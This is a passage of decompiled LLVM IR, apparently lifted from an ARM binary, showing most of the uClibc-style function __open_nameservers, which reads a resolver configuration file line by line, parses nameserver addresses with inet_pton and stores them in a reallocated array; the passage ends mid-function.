  uselistorder i8* %v1_20088, { 1, 0 }
  uselistorder i32 %v2_200b4, { 0, 2, 3, 1 }
  uselistorder i1 %v2_200a0, { 1, 0 }
  uselistorder i8 %v2_2008816, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 2, 0, 3, 1 }
  uselistorder i16 0, { 0, 5, 1, 6, 2, 3, 4, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 636, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_200bc, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_20098, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_200cc = load i32, i32* @r4, align 4
  store i32 %v3_200cc, i32* %stack_var_-36, align 4
  %v12_200cc = load i32, i32* @r7, align 4
  %v15_200cc = load i32, i32* @r8, align 4
  %v18_200cc = load i32, i32* @sb, align 4
  %v21_200cc = load i32, i32* @sl, align 4
  %v27_200cc = load i32, i32* @lr, align 4
  store i32 30168, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r5, align 4
  %v4_200dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30168) to i32*), align 4
  store i32 %v4_200dc, i32* @r4, align 4
  %v2_200e0 = icmp eq i32 %v4_200dc, 0
  br i1 %v2_200e0, label %dec_label_pc_200ec, label %dec_label_pc_2011c

dec_label_pc_200ec:                               ; preds = %entry
  %v2_200f0 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_200f0, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34628), i32* %r0.global-to-local, align 4
  %v2_200f8 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34628), i32 %v2_200f0)
  store i32 %v2_200f8, i32* %r0.global-to-local, align 4
  %v2_200fc = icmp eq i32 %v2_200f8, 0
  %v1_20100 = load i32, i32* @r4, align 4
  %.v1_20100 = select i1 %v2_200fc, i32 %tmp38, i32 %v1_20100
  store i32 29120, i32* %r1.global-to-local, align 4
  store i32 %.v1_20100, i32* %r2.global-to-local, align 4
  %v0_2010c = load i32, i32* @r5, align 4
  %v2_2010c = add i32 %v0_2010c, 29120
  %v3_2010c = inttoptr i32 %v2_2010c to i32*
  %v4_2010c = load i32, i32* %v3_2010c, align 4
  store i32 %v4_2010c, i32* %r3.global-to-local, align 4
  %v9_20110 = icmp eq i32 %v4_2010c, %.v1_20100
  br i1 %v9_20110, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_200ec
  store i32 %.v1_20100, i32* %v3_2010c, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_200ec, %bb
  store i32 131356, i32* @lr, align 4
  %v1_20118 = xor i1 %v9_20110, true
  call void @__pseudo_cond_branch(i1 %v1_20118, i32 ptrtoint (i32* @global_var_20528.1852 to i32))
  %v0_20120.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2011c

dec_label_pc_2011c:                               ; preds = %entry, %bb58
  %v2_20134 = phi i32 [ ptrtoint (i32* @global_var_32024.1324 to i32), %entry ], [ %v0_20120.pre, %bb58 ]
  store i32 30180, i32* %r3.global-to-local, align 4
  %v2_20120 = add i32 %v2_20134, 30180
  %v3_20120 = inttoptr i32 %v2_20120 to i32*
  %v4_20120 = load i32, i32* %v3_20120, align 4
  store i32 %v4_20120, i32* %r3.global-to-local, align 4
  %v2_20124 = icmp eq i32 %v4_20120, 0
  br i1 %v2_20124, label %dec_label_pc_2012c, label %dec_label_pc_204c0

dec_label_pc_2012c:                               ; preds = %dec_label_pc_2011c
  %v4_20134 = add i32 %v2_20134, 1154
  %v5_20134 = inttoptr i32 %v4_20134 to i8*
  store i8 5, i8* %v5_20134, align 1
  store i32 -34628, i32* %r0.global-to-local, align 4
  store i32 1155, i32* %r3.global-to-local, align 4
  store i32 -34656, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v3_20148 = load i32, i32* @r5, align 4
  %v5_20148 = add i32 %v3_20148, 1155
  %v6_20148 = inttoptr i32 %v5_20148 to i8*
  store i8 3, i8* %v6_20148, align 1
  %v0_2014c = load i32, i32* @r5, align 4
  %v1_2014c = load i32, i32* %r0.global-to-local, align 4
  %v2_2014c = add i32 %v1_2014c, %v0_2014c
  store i32 %v2_2014c, i32* @r0, align 4
  %v1_20150 = load i32, i32* %r1.global-to-local, align 4
  %v2_20150 = add i32 %v1_20150, %v0_2014c
  store i32 %v2_20150, i32* @r1, align 4
  %v5_20154 = call i32 @__GI_fopen(i32 %v2_2014c, i32 %v2_20150, i32 3, i32 1155)
  store i32 %v5_20154, i32* %r0.global-to-local, align 4
  store i32 %v5_20154, i32* @fp, align 4
  %v2_20158 = icmp eq i32 %v5_20154, 0
  br i1 %v2_20158, label %dec_label_pc_203e4, label %dec_label_pc_2038c

dec_label_pc_20164:                               ; preds = %dec_label_pc_2038c, %dec_label_pc_203c0.backedge
  store i32 %v2_203c0, i32* %r0.global-to-local, align 4
  %v2_20168 = call i32 @skip_and_NUL_space(i8* %v1_20168)
  store i32 %v2_20168, i32* %r0.global-to-local, align 4
  store i32 %v2_20168, i32* @r4, align 4
  %v0_20170 = call i32 @skip_nospace()
  store i32 %v0_20170, i32* %r0.global-to-local, align 4
  %v1_20174 = inttoptr i32 %v0_20170 to i8*
  %v2_20174 = call i32 @skip_and_NUL_space(i8* %v1_20174)
  store i32 %v2_20390, i32* @r1, align 4
  store i32 %v2_20174, i32* @r7, align 4
  %v0_20180 = load i32, i32* @r4, align 4
  store i32 %v0_20180, i32* %r0.global-to-local, align 4
  %v2_20184 = inttoptr i32 %v0_20180 to i8*
  %v3_20184 = call i32 @__GI_strcoll(i8* %v2_20184, i32 %v2_20390)
  store i32 %v3_20184, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_20184, 16777216
  %v1_20188 = sdiv i32 %sext, 16777216
  store i32 %v1_20188, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_20190, label %dec_label_pc_2024c

dec_label_pc_20190:                               ; preds = %dec_label_pc_20164
  %v0_20190 = load i32, i32* @r7, align 4
  store i32 %v0_20190, i32* %r0.global-to-local, align 4
  %v0_20194 = call i32 @skip_nospace()
  %v1_20194 = inttoptr i32 %v0_20194 to i8*
  store i32 %v2_20198, i32* @r4, align 4
  %v0_2019c = load i32, i32* @r6, align 4
  %v1_2019c = trunc i32 %v0_2019c to i8
  store i8 %v1_2019c, i8* %v1_20194, align 1
  %v0_201a0 = load i32, i32* @r6, align 4
  store i32 %v0_201a0, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_20198, i32* %r0.global-to-local, align 4
  %v4_201ac = call i32 @__GI_memset(i8* %v3_201ac, i32 %v0_201a0, i32 28)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_201b4 = load i32, i32* @r7, align 4
  store i32 %v0_201b4, i32* %r1.global-to-local, align 4
  store i32 %v2_201b8, i32* %r2.global-to-local, align 4
  %v3_201bc = inttoptr i32 %v0_201b4 to i8*
  %v4_201bc = call i32 @inet_pton(i32 10, i8* %v3_201bc, i32 %v2_201b8)
  store i32 %v4_201bc, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_201bc, 1
  br i1 %tmp59, label %dec_label_pc_201cc, label %dec_label_pc_201e8

dec_label_pc_201cc:                               ; preds = %dec_label_pc_20190
  %v0_201cc = load i32, i32* @r7, align 4
  store i32 %v0_201cc, i32* %r1.global-to-local, align 4
  store i32 %v2_201d0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_201d8 = inttoptr i32 %v0_201cc to i8*
  %v4_201d8 = call i32 @inet_pton(i32 2, i8* %v3_201d8, i32 %v2_201d0)
  store i32 %v4_201d8, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_201d8, 1
  br i1 %tmp60, label %dec_label_pc_203c0.backedge, label %dec_label_pc_201e8

dec_label_pc_201e8:                               ; preds = %dec_label_pc_201cc, %dec_label_pc_20190
  %v0_201ec.off0 = phi i16 [ 10, %dec_label_pc_20190 ], [ 2, %dec_label_pc_201cc ]
  store i32 %v2_201e8, i32* %r2.global-to-local, align 4
  store i16 %v0_201ec.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 30180, i32* @r7, align 4
  %v0_201fc = load i32, i32* @r5, align 4
  %v2_201fc = add i32 %v0_201fc, 30180
  %v3_201fc = inttoptr i32 %v2_201fc to i32*
  %v4_201fc = load i32, i32* %v3_201fc, align 4
  store i32 30176, i32* @sl, align 4
  %v1_20204 = add i32 %v4_201fc, 1
  store i32 %v1_20204, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_2020c = mul i32 %v1_20204, 28
  store i32 %v2_2020c, i32* %r1.global-to-local, align 4
  %v2_20210 = add i32 %v0_201fc, 30176
  %v3_20210 = inttoptr i32 %v2_20210 to i32*
  %v4_20210 = load i32, i32* %v3_20210, align 4
  store i32 %v4_20210, i32* %r0.global-to-local, align 4
  %v2_20214 = inttoptr i32 %v4_20210 to i32*
  %v3_20214 = call i32 @realloc(i32* %v2_20214, i32 %v2_2020c)
  store i32 %v3_20214, i32* %r0.global-to-local, align 4
  store i32 %v3_20214, i32* @r6, align 4
  %v2_20218 = icmp eq i32 %v3_20214, 0
  br i1 %v2_20218, label %dec_label_pc_203c0.backedge, label %dec_label_pc_20220

dec_label_pc_20220:                               ; preds = %dec_label_pc_201e8
  %v0_20220 = load i32, i32* @r5, align 4
  %v1_20220 = load i32, i32* @r7, align 4
  %v2_20220 = add i32 %v1_20220, %v0_20220
  %v3_20220 = inttoptr i32 %v2_20220 to i32*
  %v4_20220 = load i32, i32* %v3_20220, align 4
  store i32 %v4_20220, i32* %r4.global-to-local, align 4
  %v1_20224 = load i32, i32* @r8, align 4
  %v3_20224 = mul i32 %v1_20224, %v4_20220
  %v4_20224 = add i32 %v3_20224, %v3_20214
  store i32 %v4_20224, i32* %lr.global-to-local, align 4
  %v2_2022c = load i16, i16* %stack_var_-68, align 2
  %v3_2022c = sext i16 %v2_2022c to i32
  store i32 %v3_2022c, i32* %r0.global-to-local, align 4
  %v6_2022c = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_2022c, i32* %r1.global-to-local, align 4
  %v9_2022c = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_2022c, i32* %r2.global-to-local, align 4
  %v2_20230 = load i32, i32* @sl, align 4
  %v3_20230 = add i32 %v2_20230, %v0_20220
  %v4_20230 = inttoptr i32 %v3_20230 to i32*
  store i32 %v3_20214, i32* %v4_20230, align 4
  %v0_20234 = load i32, i32* %lr.global-to-local, align 4
  %v1_20234 = inttoptr i32 %v0_20234 to i32*
  %v2_20234 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_20234, i32* %v1_20234, align 4
  %v3_20234 = add i32 %v0_20234, 4
  %v4_20234 = inttoptr i32 %v3_20234 to i32*
  %v5_20234 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_20234, i32* %v4_20234, align 4
  %v6_20234 = add i32 %v0_20234, 8
  %v7_20234 = inttoptr i32 %v6_20234 to i32*
  %v8_20234 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_20234, i32* %v7_20234, align 4
  %v9_20234 = add i32 %v0_20234, 12
  %v10_20234 = inttoptr i32 %v9_20234 to i32*
  %v11_20234 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_20234, i32* %v10_20234, align 4
  %v12_20234 = add i32 %v0_20234, 16
  store i32 %v12_20234, i32* @lr, align 4
  %v2_20238 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_20238, i32* %r0.global-to-local, align 4
  %v0_2023c = load i32, i32* %r4.global-to-local, align 4
  %v1_2023c = add i32 %v0_2023c, 1
  store i32 %v1_2023c, i32* %r4.global-to-local, align 4
  %v1_20240 = inttoptr i32 %v12_20234 to i32*
  store i32 %v2_20238, i32* %v1_20240, align 4
  %v3_20240 = add i32 %v0_20234, 20
  %v4_20240 = inttoptr i32 %v3_20240 to i32*
  %v5_20240 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_20240, i32* %v4_20240, align 4
  %v6_20240 = add i32 %v0_20234, 24
  %v7_20240 = inttoptr i32 %v6_20240 to i32*
  %v8_20240 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_20240, i32* %v7_20240, align 4
  %v0_20244 = load i32, i32* %r4.global-to-local, align 4
  %v1_20244 = load i32, i32* @r5, align 4
  %v2_20244 = load i32, i32* @r7, align 4
  %v3_20244 = add i32 %v2_20244, %v1_20244
  %v4_20244 = inttoptr i32 %v3_20244 to i32*
  store i32 %v0_20244, i32* %v4_20244, align 4
  br label %dec_label_pc_203c0.backedge

dec_label_pc_203c0.backedge:                      ; preds = %dec_label_pc_202e8, %dec_label_pc_202d8, %dec_label_pc_202a4, %dec_label_pc_20220, %dec_label_pc_20378, %dec_label_pc_201cc, %dec_label_pc_201e8, %dec_label_pc_20320, %dec_label_pc_20328, %dec_label_pc_2030c, %dec_label_pc_2035c
  %v0_203cc.pre = load i32, i32* @fp, align 4
  store i32 %v2_203c0, i32* @r4, align 4
  store i32 %v2_203c0, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_203cc.pre, i32* %r2.global-to-local, align 4
  %v3_203d0 = call i32 @fgets(i32 %v2_203c0, i32 128, i32 %v0_203cc.pre)
  store i32 %v3_203d0, i32* %r0.global-to-local, align 4
  %v2_203d4 = icmp eq i32 %v3_203d0, 0
  br i1 %v2_203d4, label %dec_label_pc_203dc, label %dec_label_pc_20164

dec_label_pc_2024c:                               ; preds = %dec_label_pc_20164
  %v0_2024c = load i32, i32* @r4, align 4
  store i32 %v0_2024c, i32* %r0.global-to-local, align 4
  store i32 %v2_2039c, i32* @r1, align 4
  %v2_20254 = inttoptr i32 %v0_2024c to i8*
  %v3_20254 = call i32 @__GI_strcoll(i8* %v2_20254, i32 %v2_2039c)
  store i32 %v3_20254, i32* %r0.global-to-local, align 4
  %v2_20258 = icmp eq i32 %v3_20254, 0
  br i1 %v2_20258, label %dec_label_pc_2028c, label %dec_label_pc_20260

dec_label_pc_20260:                               ; preds = %dec_label_pc_2024c
  %v0_20260 = load i32, i32* @r4, align 4
  store i32 %v0_20260, i32* %r0.global-to-local, align 4
  store i32 %v2_203a8, i32* @r1, align 4
  %v2_20268 = inttoptr i32 %v0_20260 to i8*
  %v3_20268 = call i32 @__GI_strcoll(i8* %v2_20268, i32 %v2_203a8)
  store i32 %v3_20268, i32* %r0.global-to-local, align 4
  %v2_2026c = icmp eq i32 %v3_20268, 0
  br i1 %v2_2026c, label %dec_label_pc_2028c, label %dec_label_pc_2030c

dec_label_pc_20278:                               ; preds = %dec_label_pc_2028c, %dec_label_pc_20278.dec_label_pc_20278_crit_edge
  %v2_2027c = phi i32 [ %v1_20290, %dec_label_pc_20278.dec_label_pc_20278_crit_edge ], [ %v1_2029010, %dec_label_pc_2028c ]
  %v0_2027c = phi i32 [ %v1_20298, %dec_label_pc_20278.dec_label_pc_20278_crit_edge ], [ %v1_2029817, %dec_label_pc_2028c ]
  %v1_20278 = phi i32 [ %v1_20278.pre, %dec_label_pc_20278.dec_label_pc_20278_crit_edge ], [ 30172, %dec_label_pc_2028c ]
  %v1_2027c = phi i32 [ %v0_20290, %dec_label_pc_20278.dec_label_pc_20278_crit_edge ], [ %v0_202909, %dec_label_pc_2028c ]
  %v2_20278 = add i32 %v1_2027c, %v1_20278
  %v3_20278 = inttoptr i32 %v2_20278 to i32*
  %v4_20278 = load i32, i32* %v3_20278, align 4
  store i32 %v4_20278, i32* %r3.global-to-local, align 4
  %v3_2027c = add i32 %v1_2027c, %v2_2027c
  %v4_2027c = inttoptr i32 %v3_2027c to i32*
  store i32 %v0_2027c, i32* %v4_2027c, align 4
  %v0_20280 = load i32, i32* %r3.global-to-local, align 4
  %v1_20280 = load i32, i32* %r2.global-to-local, align 4
  %v4_20280 = mul i32 %v1_20280, 4
  %v5_20280 = add i32 %v4_20280, %v0_20280
  %v6_20280 = inttoptr i32 %v5_20280 to i32*
  %v7_20280 = load i32, i32* %v6_20280, align 4
  store i32 %v7_20280, i32* @r0, align 4
  %v0_20284 = call i32 @free()
  store i32 %v0_20284, i32* %r0.global-to-local, align 4
  %v0_20290 = load i32, i32* @r5, align 4
  %v1_20290 = load i32, i32* @sb, align 4
  %v2_20290 = add i32 %v1_20290, %v0_20290
  %v3_20290 = inttoptr i32 %v2_20290 to i32*
  %v4_20290 = load i32, i32* %v3_20290, align 4
  store i32 %v4_20290, i32* %r3.global-to-local, align 4
  %v2_20294 = icmp eq i32 %v4_20290, 0
  %v1_20298 = add i32 %v4_20290, -1
  store i32 %v1_20298, i32* %r2.global-to-local, align 4
  br i1 %v2_20294, label %dec_label_pc_202a0, label %dec_label_pc_20278.dec_label_pc_20278_crit_edge

dec_label_pc_20278.dec_label_pc_20278_crit_edge:  ; preds = %dec_label_pc_20278
  %v1_20278.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_20278

dec_label_pc_2028c:                               ; preds = %dec_label_pc_20260, %dec_label_pc_2024c
  store i32 30172, i32* @r4, align 4
  %v0_202909 = load i32, i32* @r5, align 4
  %v1_2029010 = load i32, i32* @sb, align 4
  %v2_2029011 = add i32 %v1_2029010, %v0_202909
  %v3_2029012 = inttoptr i32 %v2_2029011 to i32*
  %v4_2029013 = load i32, i32* %v3_2029012, align 4
  store i32 %v4_2029013, i32* %r3.global-to-local, align 4
  %v2_2029415 = icmp eq i32 %v4_2029013, 0
  %v1_2029817 = add i32 %v4_2029013, -1
  store i32 %v1_2029817, i32* %r2.global-to-local, align 4
  br i1 %v2_2029415, label %dec_label_pc_202a0, label %dec_label_pc_20278

dec_label_pc_202a0:                               ; preds = %dec_label_pc_20278, %dec_label_pc_2028c
  store i32 30172, i32* @r6, align 4
  br label %dec_label_pc_202a4

dec_label_pc_202a4:                               ; preds = %dec_label_pc_202e8, %dec_label_pc_202a0
  %v0_202a4 = load i32, i32* @r7, align 4
  store i32 %v0_202a4, i32* %r0.global-to-local, align 4
  %v0_202a8 = call i32 @skip_nospace()
  store i32 %v0_202a8, i32* %r0.global-to-local, align 4
  %v1_202ac = inttoptr i32 %v0_202a8 to i8*
  %v2_202ac = call i32 @skip_and_NUL_space(i8* %v1_202ac)
  store i32 %v2_202ac, i32* %r0.global-to-local, align 4
  %v0_202b0 = load i32, i32* @r5, align 4
  %v1_202b0 = load i32, i32* @sb, align 4
  %v2_202b0 = add i32 %v1_202b0, %v0_202b0
  %v3_202b0 = inttoptr i32 %v2_202b0 to i32*
  %v4_202b0 = load i32, i32* %v3_202b0, align 4
  store i32 %v2_202ac, i32* @r4, align 4
  %tmp69 = mul i32 %v4_202b0, 4
  %v3_202bc = add i32 %tmp69, 4
  store i32 %v3_202bc, i32* %r1.global-to-local, align 4
  %v1_202c0 = load i32, i32* @r6, align 4
  %v2_202c0 = add i32 %v1_202c0, %v0_202b0
  %v3_202c0 = inttoptr i32 %v2_202c0 to i32*
  %v4_202c0 = load i32, i32* %v3_202c0, align 4
  store i32 %v4_202c0, i32* %r0.global-to-local, align 4
  %v2_202c4 = inttoptr i32 %v4_202c0 to i32*
  %v3_202c4 = call i32 @realloc(i32* %v2_202c4, i32 %v3_202bc)
  store i32 %v3_202c4, i32* %r3.global-to-local, align 4
  %v2_202c8 = icmp eq i32 %v3_202c4, 0
  %v0_202cc = load i32, i32* @r7, align 4
  store i32 %v0_202cc, i32* %r0.global-to-local, align 4
  %v0_202d0 = load i32, i32* @r4, align 4
  store i32 %v0_202d0, i32* @r7, align 4
  br i1 %v2_202c8, label %dec_label_pc_203c0.backedge, label %dec_label_pc_202d8

dec_label_pc_202d8:                               ; preds = %dec_label_pc_202a4
  %v1_202d8 = load i32, i32* @r5, align 4
  %v2_202d8 = load i32, i32* @r6, align 4
  %v3_202d8 = add i32 %v2_202d8, %v1_202d8
  %v4_202d8 = inttoptr i32 %v3_202d8 to i32*
  store i32 %v3_202c4, i32* %v4_202d8, align 4
  %v1_202dc = inttoptr i32 %v0_202cc to i8*
  %v2_202dc = call i32 @__GI_strdup(i8* %v1_202dc)
  store i32 %v2_202dc, i32* %r0.global-to-local, align 4
  %v2_202e0 = icmp eq i32 %v2_202dc, 0
  br i1 %v2_202e0, label %dec_label_pc_203c0.backedge, label %dec_label_pc_202e8

dec_label_pc_202e8:                               ; preds = %dec_label_pc_202d8
  %v0_202e8 = load i32, i32* @r5, align 4
  %v1_202e8 = load i32, i32* @sb, align 4
  %v2_202e8 = add i32 %v1_202e8, %v0_202e8
  %v3_202e8 = inttoptr i32 %v2_202e8 to i32*
  %v4_202e8 = load i32, i32* %v3_202e8, align 4
  store i32 %v4_202e8, i32* %r3.global-to-local, align 4
  %v1_202ec = load i32, i32* @r6, align 4
  %v2_202ec = add i32 %v1_202ec, %v0_202e8
  %v3_202ec = inttoptr i32 %v2_202ec to i32*
  %v4_202ec = load i32, i32* %v3_202ec, align 4
  store i32 %v4_202ec, i32* %r2.global-to-local, align 4
  %v1_202f0 = add i32 %v4_202e8, 1
  store i32 %v1_202f0, i32* %r1.global-to-local, align 4
  %v5_202f4 = mul i32 %v4_202e8, 4
  %v6_202f4 = add i32 %v4_202ec, %v5_202f4
  %v7_202f4 = inttoptr i32 %v6_202f4 to i32*
  store i32 %v2_202dc, i32* %v7_202f4, align 4
  %v0_202f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_202f8 = load i32, i32* @r5, align 4
  %v2_202f8 = load i32, i32* @sb, align 4
  %v3_202f8 = add i32 %v2_202f8, %v1_202f8
  %v4_202f8 = inttoptr i32 %v3_202f8 to i32*
  store i32 %v0_202f8, i32* %v4_202f8, align 4
  %v0_202fc = load i32, i32* @r4, align 4
  %v1_202fc = inttoptr i32 %v0_202fc to i8*
  %v2_202fc = load i8, i8* %v1_202fc, align 1
  %v3_202fc = zext i8 %v2_202fc to i32
  store i32 %v3_202fc, i32* %r3.global-to-local, align 4
  %v2_20300 = icmp eq i8 %v2_202fc, 0
  br i1 %v2_20300, label %dec_label_pc_203c0.backedge, label %dec_label_pc_202a4

dec_label_pc_2030c:                               ; preds = %dec_label_pc_20260
  %v0_2030c = load i32, i32* @r4, align 4
  store i32 %v0_2030c, i32* %r0.global-to-local, align 4
  %v2_20310 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_20310, i32* @r1, align 4
  %v2_20314 = inttoptr i32 %v0_2030c to i8*
  %v3_20314 = call i32 @__GI_strcoll(i8* %v2_20314, i32 %v2_20310)
  store i32 %v3_20314, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_20314, 16777216
  %v1_20318 = sdiv i32 %sext2, 16777216
  store i32 %v1_20318, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_20320, label %dec_label_pc_203c0.backedge

dec_label_pc_20320:                               ; preds = %dec_label_pc_2030c
  %v0_20320 = load i32, i32* @r7, align 4
  %v2_20320 = icmp eq i32 %v0_20320, 0
  br i1 %v2_20320, label %dec_label_pc_203c0.backedge, label %dec_label_pc_20328

dec_label_pc_20328:                               ; preds = %dec_label_pc_20320
  store i32 %v0_20320, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_20330 = call i32 @__GI_strchr(i32 %v0_20320, i32 58)
  store i32 %v2_20330, i32* %r0.global-to-local, align 4
  store i32 %v2_20330, i32* @r6, align 4
  %v3_20334 = icmp eq i32 %v2_20330, 0
  br i1 %v3_20334, label %dec_label_pc_203c0.backedge, label %dec_label_pc_2033c

dec_label_pc_2033c:                               ; preds = %dec_label_pc_20328
  store i32 -34572, i32* %r1.global-to-local, align 4
  %v0_20340 = load i32, i32* @r4, align 4
  %v1_20340 = trunc i32 %v0_20340 to i8
  %v3_20340 = inttoptr i32 %v2_20330 to i8*
  store i8 %v1_20340, i8* %v3_20340, align 1
  %v0_20344 = load i32, i32* @r5, align 4
  %v1_20344 = load i32, i32* %r1.global-to-local, align 4
  %v2_20344 = add i32 %v1_20344, %v0_20344
  store i32 %v2_20344, i32* @r1, align 4
  %v0_20348 = load i32, i32* @r7, align 4
  store i32 %v0_20348, i32* %r0.global-to-local, align 4
  %v2_2034c = inttoptr i32 %v0_20348 to i8*
  %v3_2034c = call i32 @__GI_strcoll(i8* %v2_2034c, i32 %v2_20344)
  store i32 %v3_2034c, i32* %r0.global-to-local, align 4
  %v2_20350 = icmp eq i32 %v3_2034c, 0
  br i1 %v2_20350, label %dec_label_pc_20378, label %dec_label_pc_2035c

dec_label_pc_2035c:                               ; preds = %dec_label_pc_2033c
  %v0_20360 = load i32, i32* @r7, align 4
  store i32 %v0_20360, i32* %r0.global-to-local, align 4
  %v0_20364 = load i32, i32* @r5, align 4
  %v2_20364 = add i32 %v0_20364, -34564
  store i32 %v2_20364, i32* @r1, align 4
  %v2_20368 = inttoptr i32 %v0_20360 to i8*
  %v3_20368 = call i32 @__GI_strcoll(i8* %v2_20368, i32 %v2_20364)
  store i32 %v3_20368, i32* %r0.global-to-local, align 4
  %v2_2036c = icmp eq i32 %v3_20368, 0
  br i1 %v2_2036c, label %dec_label_pc_20378, label %dec_label_pc_203c0.backedge

dec_label_pc_20378:                               ; preds = %dec_label_pc_2035c, %dec_label_pc_2033c
  %storemerge = phi i32 [ 1154, %dec_label_pc_2033c ], [ 1155, %dec_label_pc_2035c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_20378 = load i32, i32* @r6, align 4
  %v1_20378 = add i32 %v0_20378, 1
  store i32 %v1_20378, i32* @r0, align 4
  %v0_2037c = load i32, i32* @r5, align 4
  %v2_2037c = add i32 %v0_2037c, %storemerge
  store i32 %v2_2037c, i32* @r4, align 4
  %v1_20380 = call i32 @atol(i32 %v1_20378)
  %v2_20380 = trunc i32 %v1_20380 to i8
  store i32 %v1_20380, i32* %r0.global-to-local, align 4
  %v3_20384 = load i32, i32* @r4, align 4
  %v4_20384 = inttoptr i32 %v3_20384 to i8*
  store i8 %v2_20380, i8* %v4_20384, align 1
  br label %dec_label_pc_203c0.backedge

dec_label_pc_2038c:                               ; preds = %dec_label_pc_2012c
  %v0_20390 = load i32, i32* @r5, align 4
  %v2_20390 = add i32 %v0_20390, -34608
  %v2_2039c = add i32 %v0_20390, -34596
  %v2_203a8 = add i32 %v0_20390, -34588
  %v2_203b4 = add i32 %v0_20390, -34580
  store i32 %v2_203b4, i32* %r3.global-to-local, align 4
  store i32 30184, i32* @sb, align 4
  store i32 %v2_203b4, i32* %stack_var_-560, align 4
  %v2_203c0 = ptrtoint i32* %stack_var_-288 to i32
  %v1_20168 = bitcast i32* %stack_var_-288 to i8*
  %v2_20198 = ptrtoint i16* %stack_var_-68 to i32
  %v3_201ac = bitcast i16* %stack_var_-68 to i8*
  %v2_201b8 = ptrtoint i32* %stack_var_-60 to i32
  %v2_201d0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_201e8 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_203c0, i32* @r4, align 4
  store i32 %v2_203c0, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v5_20154, i32* %r2.global-to-local, align 4
  %v3_203d066 = call i32 @fgets(i32 %v2_203c0, i32 128, i32 %v5_20154)
  store i32 %v3_203d066, i32* %r0.global-to-local, align 4
  %v2_203d468 = icmp eq i32 %v3_203d066, 0
  br i1 %v2_203d468, label %dec_label_pc_203dc, label %dec_label_pc_20164

dec_label_pc_203dc:                               ; preds = %dec_label_pc_203c0.backedge, %dec_label_pc_2038c
  %v0_203dc = load i32, i32* @fp, align 4
  store i32 %v0_203dc, i32* %r0.global-to-local, align 4
  %v1_203e0 = inttoptr i32 %v0_203dc to i16*
  %v2_203e0 = call i32 @__GI_fclose(i16* %v1_203e0)
  store i32 %v2_203e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_203e4

dec_label_pc_203e4:                               ; preds = %dec_label_pc_2012c, %dec_label_pc_203dc
  store i32 30180, i32* %r3.global-to-local, align 4
  %v0_203e8 = load i32, i32* @r5, align 4
  %v2_203e8 = add i32 %v0_203e8, 30180
  %v3_203e8 = inttoptr i32 %v2_203e8 to i32*
  %v4_203e8 = load i32, i32* %v3_203e8, align 4
  store i32 %v4_203e8, i32* %r3.global-to-local, align 4
  %v2_203ec = icmp eq i32 %v4_203e8, 0
